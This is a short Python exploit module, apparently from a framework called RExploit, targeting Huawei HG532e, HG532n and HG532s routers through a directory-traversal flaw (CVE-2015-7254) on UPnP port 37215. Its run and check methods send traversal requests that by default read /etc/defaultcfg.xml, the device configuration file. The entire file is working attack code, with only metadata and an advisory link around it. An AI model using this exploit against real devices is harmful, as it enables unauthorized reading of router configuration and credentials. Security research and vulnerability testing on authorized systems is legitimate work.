import requests

from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="HG532X Remote arbitrary file read on Huawei",
            category="lfi",
            authors={
                "Roberto Paleari && Aristide Fattori": "Vulnerability discovery",
                "Daniel Diez": "RExploit module"
            },
            targets=[
                "HG532e",
                "HG532n",
                "HG532s"
            ],
            date="06/11/2015",
            cwe="CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
            description="Multiple Huawei CPE models are vulnerable to a directory traversal issue affecting an Internet-facing web port (tcp/37215, on the tested devices). This port is devoted to the UPnP service.",
            references={
                "https://github.com/ud2/advisories/tree/master/embedded/huawei/cve-2015-7254/": "GitHub"
            }
        )

    def default(self):
        path = '/etc/defaultcfg.xml'

        return path

    def run(self, path):
        URL = "http://{0}:37215/icon/../../../{1}".format(self.getIP(), path)
        r = requests.get(URL)

        if r.status_code == 200:
            return r
        else:
            return "Error"

    def check(self):
        path = self.default()
        URL = "http://{0}:37215/icon/../../../{1}".format(self.getIP(), path)
        try:
            r = requests.get(URL)

            if r.status_code == 200:
                return True
            else:
                return False
        except requests.ConnectionError:
            return None
